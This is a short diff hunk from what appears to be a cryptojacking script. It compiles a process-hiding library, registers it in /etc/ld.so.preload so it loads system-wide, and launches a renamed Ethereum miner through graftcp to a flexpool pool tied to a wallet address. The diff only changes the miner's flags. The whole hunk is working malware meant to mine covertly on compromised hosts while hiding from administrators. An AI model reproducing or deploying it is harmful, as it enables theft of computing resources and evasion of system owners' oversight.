@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=ssl://0x8CB8003E428D0Fd7693D22f576A212403728c64a.bezzHash@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --ocX --list-modes --mt-auto
+./graftcp/graftcp ./bezzHash --url=ssl://0x8CB8003E428D0Fd7693D22f576A212403728c64a.bezzHash@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes
